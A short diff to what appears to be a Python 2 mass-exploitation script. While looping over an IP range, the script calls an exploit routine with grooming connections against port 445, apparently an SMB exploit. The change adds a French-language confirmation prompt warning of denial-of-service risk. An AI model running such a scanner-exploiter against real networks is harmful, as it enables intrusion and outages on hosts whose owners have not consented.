@@ -1272,9 +1272,13 @@ for i in ip_range:
 
 				elif port == 445:
 					numGroomConn = 13
-					try:
-						exploit(current_target, sc, numGroomConn)
-					except KeyboardInterrupt:
+					choice = raw_input("[*] grand risque de déni de service. Executer? (y or n)")
+					if choice == 'y':
+						try:
+							exploit(current_target, sc, numGroomConn)
+						except KeyboardInterrupt:
+							continue
+					else:
 						continue
 					
 				else:
